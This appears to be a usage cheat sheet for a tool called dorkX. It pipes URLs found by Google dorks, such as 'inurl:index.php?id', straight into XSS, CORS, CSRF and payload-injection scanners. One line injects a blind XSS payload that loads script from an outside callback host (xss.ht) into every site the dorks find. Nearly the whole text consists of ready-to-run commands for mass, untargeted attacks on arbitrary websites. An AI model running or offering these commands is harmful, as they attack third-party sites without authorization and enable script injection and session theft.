#Blind XSS
 ./dorkX -dorks dorks.txt -concurrency 100 | dalfox pipe -b '"><script src=https://z0id.xss.ht></script>'
#XSS
./dorkx -dorks dorks.txt | dalfox pipe
./dorkx -dork "inurl:index.php?id" | dalfox pipe

#Cors
./dorkx -dorks dorks.txt | ./corsx
~/dorkX> ./dorkx -dork "inurl:index.php?id" | ./corsx

#CSRF
./dorkx -dorks dorks.txt | ./csrfx
./dorkx -dork "inurl:index.php?id" | ./csrf

#Payload Injection
./dorkx -dorks dorks.txt | ./zin -pL <payloadList>
./dorkx -dork "inurl:index.php?id" |./zin -p <payload>
